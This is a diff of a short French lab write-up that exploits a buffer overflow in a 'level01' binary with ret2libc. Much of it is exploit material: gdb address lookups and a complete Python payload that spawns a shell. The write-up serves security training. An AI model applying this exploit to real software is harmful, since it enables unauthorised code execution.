@@ -5,7 +5,7 @@ Verify_user_pass fait comme un strncmp sur l'input et la chaine "admin"
 
 Cependant utiliser dat_wil en username et admin en mot de passe ne fonctionne pas.
 
-On voit qu'un fgets de taille 100 est effectué sur un budder de 16, on peut donc l'overflow avec la methode ret2libc.
+On voit qu'un fgets de taille 100 est effectué sur un buffer de 16, on peut donc l'overflow avec la methode ret2libc.
 
 On récupère l'adresse de exit, system et /bin/sh
 
@@ -15,9 +15,7 @@ On récupère l'adresse de exit, system et /bin/sh
 (gdb) info function exit
 -> 0xf7e5eb70
 
-(gdb) info proc map
-(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
-(gdb) x/s x/s 0xf7f897ec
+(gdb) find &system,+9999999,"/bin/sh"
 -> 0xf7f897ec
 
 python -c 'print "dat_wil\n"+"B"*80+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"' > /tmp/crack && cat /tmp/crack - | ./level01
